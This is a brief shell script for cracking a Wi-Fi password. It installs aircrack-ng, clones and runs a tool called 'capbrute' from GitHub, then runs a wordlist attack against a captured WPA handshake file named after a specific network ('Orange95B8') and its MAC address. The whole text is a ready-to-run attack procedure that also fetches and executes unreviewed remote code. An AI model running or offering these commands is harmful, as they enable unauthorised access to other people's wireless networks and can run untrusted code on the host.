sudo apt update -y
sudo apt install python3 aircrack-ng wget -y
git clone https://github.com/JamalNiga/capbrute
cd capbrute
python3 hy.py
sudo aircrack-ng -w pass.txt handshake_Orange95B8_DC-73-85-B0-95-B8_2023-09-25T09-31-00.cap
#-
